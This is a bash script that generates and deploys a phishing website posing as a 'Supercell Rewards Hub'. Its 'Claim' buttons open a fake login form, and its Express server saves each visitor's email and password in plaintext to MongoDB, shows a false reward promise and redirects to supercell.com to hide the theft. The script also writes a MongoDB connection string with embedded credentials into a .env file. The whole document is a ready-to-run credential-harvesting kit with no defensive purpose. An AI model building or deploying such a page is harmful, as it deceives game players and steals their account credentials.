#!/bin/bash
# 1. Find and move JSON
JSON_FILE=$(find /sdcard -type f -name "*.json" -print -quit)
if [ -z "$JSON_FILE" ]; then
  echo "No JSON file found in /sdcard"
  exit 1
fi
cp "$JSON_FILE" ./site.json
echo "Found and moved JSON: $JSON_FILE"

# 2. Make public folder
mkdir -p public

# 3. Create build.js
cat > build.js << 'EOL'
const fs = require('fs');
const data = JSON.parse(fs.readFileSync('site.json', 'utf8'));

let html = `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.title || "Supercell Rewards Hub"}</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f8f8f8; }
header { background: #ffcc00; text-align: center; padding: 20px; }
section { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; }
.item { background: white; padding: 15px; border-radius: 10px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
.item img { max-width: 100%; border-radius: 10px; }
button { background: #ff6600; border: none; color: white; padding: 10px 15px; border-radius: 5px; cursor: pointer; }
button:hover { background: #e65c00; }
</style>
</head>
<body>
<header><h1>${data.header?.text || "Supercell Rewards Hub"}</h1></header>
<section>
`;

if (data.items) {
    data.items.forEach(item => {
        html += `<div class="item">
            <img src="${item.image || ''}">
            <h3>${item.title || ''}</h3>
            <button onclick="openLogin()">${item.buttonText || 'Claim'}</button>
        </div>`;
    });
}

html += `
</section>
<div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);">
    <div style="background:#fff;margin:10% auto;padding:20px;max-width:400px;border-radius:10px;">
        <h2>Login to Claim</h2>
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="Email" required style="width:100%;padding:10px;margin:5px 0;">
            <input type="password" name="password" placeholder="Password" required style="width:100%;padding:10px;margin:5px 0;">
            <button type="submit" style="width:100%;">Submit</button>
        </form>
        <button onclick="closeLogin()" style="margin-top:10px;width:100%;">Close</button>
    </div>
</div>
<script>
function openLogin(){ document.getElementById('loginModal').style.display='block'; }
function closeLogin(){ document.getElementById('loginModal').style.display='none'; }
</script>
</body></html>`;
fs.writeFileSync('public/index.html', html);
console.log("index.html generated in /public");
EOL

# 4. Run build.js
node build.js

# 5. Create server.js
cat > server.js << 'EOL'
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

mongoose.connect(process.env.MONGODB_URI)
.then(() => console.log("MongoDB Connected"))
.catch(err => console.error("MongoDB connection error:", err));

const userSchema = new mongoose.Schema({ email: String, password: String });
const User = mongoose.model('User', userSchema);

app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    await User.create({ email, password });
    res.send(`<script>alert('Thank you! Your reward will be delivered within 24 hours.'); window.location.href='https://supercell.com';</script>`);
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(\`Server running on port \${PORT}\`));
EOL

# 6. Create .env
cat > .env << 'EOL'
MONGODB_URI=mongodb+srv://sittubittus:HlWMDOIFlyle07WK@cluster0.ss60ylm.mongodb.net/?retryWrites=true&w=majority
EOL

echo "Setup complete!"
